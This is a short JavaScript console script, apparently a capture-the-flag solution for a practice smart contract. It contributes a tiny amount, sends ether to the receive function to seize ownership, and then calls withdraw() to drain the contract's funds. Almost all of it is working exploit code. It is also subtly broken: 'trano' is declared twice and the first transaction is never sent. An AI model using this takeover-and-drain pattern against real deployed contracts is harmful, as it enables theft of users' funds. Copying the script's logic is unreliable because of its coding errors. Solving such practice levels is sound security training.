
let oa = await contract.owner();
await contract.contributions(oa).then(function(balance) { balanceInstance = balance});
balanceInstance.words[0];

// Send some contributions for funding rights
let trano = {from : player, value : toWei('0.0009999'), to : instance, data : "0xd7bb99ba"/* signature of contribute function*/};
await contract.contributions(player).then(function(balance) { balanceInstance = balance});
console.log(balanceInstance.words[0]); // log to check non zero fundingrights

// now with funds lets blow out ownwership by flooding the con instance
let trano = {from : player, value : toWei('0.01'), to : instance, data : "0xa3e76c0f" /* signature of recieve */};
await contract.sendTransaction(trano, function (e, r) {console.log(`err is ${e}`); console.log(`response is ${r}`)});

// with newfound ownwership, drain the damm thing
await contract.withdraw();
